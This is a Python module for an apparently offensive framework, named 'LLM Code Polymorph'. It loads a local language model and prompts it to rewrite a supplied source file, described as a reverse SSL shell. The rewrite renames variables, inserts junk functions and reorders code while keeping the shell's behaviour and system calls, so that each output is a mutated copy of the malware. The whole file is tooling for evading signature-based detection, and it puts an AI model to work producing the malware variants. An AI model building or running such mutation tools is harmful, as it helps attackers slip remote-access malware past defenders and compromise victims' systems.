import os
from core.module_interface import ModuleInterface
from core.logger import Logger

logger = Logger()

class PolymorphLLM(ModuleInterface):
    def get_metadata(self):
        return {"name": "LLM Code Polymorph", "version": "1.0", "type": "ai"}

    def run(self, config):
        source_file = config.get("source_file")
        if not source_file or not os.path.exists(source_file):
            return {"status": "error", "message": "source_file missing"}
        model_path = config.get("llm_model_path", "models/mistral-7b.gguf")
        try:
            from llama_cpp import Llama
        except ImportError:
            logger.error("llama-cpp-python not installed")
            return {"status": "error", "message": "llama-cpp-python required"}
        llm = Llama(model_path=model_path, n_ctx=2048, n_threads=4)
        with open(source_file, 'r') as f:
            code = f.read()
        prompt = f"""Rewrite the following Python code to change variable names, add two useless functions (e.g., Fibonacci, prime checker), reorder blocks, but keep the exact same functionality (reverse SSL shell). Do not remove any important system calls. Output only the new code, no explanation.

Original code:
{code}

New code:
"""
        output = llm(prompt, max_tokens=2048, temperature=0.8, stop=["```"])
        new_code = output['choices'][0]['text']
        out_file = "polymorph_output.py"
        with open(out_file, 'w') as f:
            f.write(new_code)
        logger.info("Code polymorphe généré", output=out_file)
        return {"status": "success", "polymorphed_file": out_file}
